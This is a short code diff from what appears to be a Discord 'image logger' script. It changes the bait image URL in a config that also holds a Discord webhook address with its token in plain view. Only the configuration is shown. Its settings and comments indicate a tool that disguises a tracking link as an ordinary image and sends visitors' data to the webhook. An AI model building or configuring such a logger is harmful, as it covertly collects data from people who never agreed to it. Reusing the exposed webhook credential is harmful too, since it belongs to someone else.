@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1376180441660395530/HGCRo3QNyysNEkMN3aFX6cvI0ToAym4w7KE1fQXK5G0LozsMgrv8pbNJb9AXLUw12c_c",
-    "image": "https://sm.ign.com/ign_de/review/m/marvels-sp/marvels-spider-man-2-review_rt58.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://www.ziprecruiter.com/svc/fotomat/public-ziprecruiter/cms/839410430Logger.jpg=ws1280x960", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
